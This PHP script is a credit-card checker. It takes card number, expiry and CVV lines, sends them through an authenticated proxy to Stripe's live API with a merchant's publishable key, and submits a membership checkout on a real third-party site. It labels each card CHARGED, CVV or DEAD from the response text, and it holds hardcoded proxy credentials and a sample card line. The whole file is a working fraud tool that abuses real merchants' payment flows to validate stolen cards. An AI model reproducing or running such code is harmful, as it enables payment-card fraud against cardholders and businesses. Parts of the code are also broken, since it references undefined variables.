<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$idd = '322580920';
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
/*
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();
*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}



# -------------------- [1 REQ] -------------------#
/////4347691118438373|10|2024|852

$proxy = '192.227.241.115:12345';
$proxyAuth = 'tickets:proxyon145'; // Replace with your proxy authentication details if required

// Target URL
$url = 'https://www.bgcmilwaukee.org/give-today/donate/';

// Payload data


$url = 'https://api.stripe.com/v1/payment_methods';

// Payload data
$header = array(
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
);
//&card[cvc]=000
$data = 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3ee0577c-fa1a-46eb-a64a-4f213992472fb076dc&muid=a80e2bae-f014-49ca-8b10-3c34f02234c21b4f53&sid=632067a1-5e82-424c-9b37-42025361981d1aa353&payment_user_agent=stripe.js%2F2d3a08de7b%3B+stripe-js-v3%2F2d3a08de7b%3B+split-card-element&referrer=https%3A%2F%2F937footballinsider.com&time_on_page=64806&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1KHCEQEOdymRpNEG';
// Initialize cURL session
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$r2 = curl_exec($ch);
$data = json_decode($r2, true);
$id = $data['id'];
$crt = $data['created'];
$exp = $data['exp_year'];

$url = 'https://937footballinsider.com/membership-account/membership-checkout/?level=1';

// Payload data
$header = array(
'authority: 937footballinsider.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'cache-control: max-age=0',
'content-type: application/x-www-form-urlencoded',
'origin: https://937footballinsider.com',
'referer: https://937footballinsider.com/membership-account/membership-checkout/?level=1',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
);
$data = 'level=1&checkjavascript=1&username='.$first.''.$last.'&password=123456789&password2=123456789&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX7547&ExpirationMonth=03&ExpirationYear='.$ano.'';
// Initialize cURL session
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$result1 = curl_exec($ch);
$data = json_decode($r3, true);
//$pi = $data['data']['id'];
//$scrt = $data['data']['client_secret'];
if (
      strpos($result1, '/thank-you-donation/') !== false ||
      strpos($result1, 'WE THANK YOU!') !== false ||
      strpos($result1, 'Thanks for your donation! Please check your email for a receipt.') !== false ||
      strpos($result1, 'incorrect_zip') !== false ||
      strpos($result1, 'Success ') !== false ||
      strpos($result1, '"type":"one-time"') !== false ||
      strpos($result1, '/donations/thank_you?donation_number=') !== false
  ) {
    echo "CHARGED</span>  </span>CC: $lista</span>  <br>RESPONSE: CHARGED</span><br>";
  }
    elseif(strpos($result1, "Your card has insufficient funds.") || strpos($result1, "insufficient_funds")) {
      echo "CVV</span>  </span>CC: $lista</span>  <br>RESPONSE: insufficient_funds</span><br>";
    }
    elseif(strpos($result1, 'security code is incorrect.') !== false || strpos($result1, 'security code is invalid.') !== false || strpos($result1, "incorrect_cvc") !== false) {
      echo "CVV</span>  </span>CC: $lista</span>  <br>RESPONSE: incorrect_cvc</span><br>";
    }
    elseif(strpos($result1, "Your card does not support this type of purchase.")) {
      echo "CVV</span>  </span>CC: $lista</span>  <br>RESPONSE: Your card doesn't support this type of purchase</span><br>";
    }
    elseif(strpos($result1, "stripe_3ds2_fingerprint")) {
      echo "CVV</span>  </span>CC: $lista</span>  <br>RESPONSE:3D_Required</span><br>";
    }
    elseif(strpos($result1, "card was declined.")) {
      echo "DEAD</span>  </span>CC: $lista</span>  <br>RESPONSE: card was declined</span><br>";
    }
  else{
    echo "DEAD</span>  </span>CC: $lista</span><br>RESPONSE: Dead: $msg</span><br>";


  }

curl_close($ch);


ob_flush();



?>